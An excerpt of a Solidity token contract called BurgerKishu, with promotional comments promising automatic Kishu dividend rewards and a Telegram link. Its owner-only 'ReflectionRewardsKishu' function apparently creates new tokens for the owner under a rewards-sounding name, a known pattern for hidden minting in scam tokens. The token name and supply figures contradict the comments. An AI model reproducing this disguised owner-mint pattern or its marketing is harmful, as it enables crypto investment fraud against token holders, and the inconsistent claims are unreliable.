...
//
// $BurgerKishu proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN KISHU! With the auto-claim feature,
// simply BurgerKishu and you'll receive Kishu automatically in your wallet.
// 
// BurgerKishu and get rewarded in Kishu on every transaction!
//
//
// 📱 Telegram:https://t.me/BurgerKishu
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflectionRewardsKishu(uint256 amount) public onlyOwner {
    _ReflectionRewardsKishu(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsKishu(address account, uint256 amount) internal virtual {
...
contract BurgerKishu is ERC20 {

    uint tokenTotalSupply = 1000000000000000; // 100 Million Token Supply

    constructor() public ERC20("Mini London", "BKISHU") {
        _ReflectionRewardsKishu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}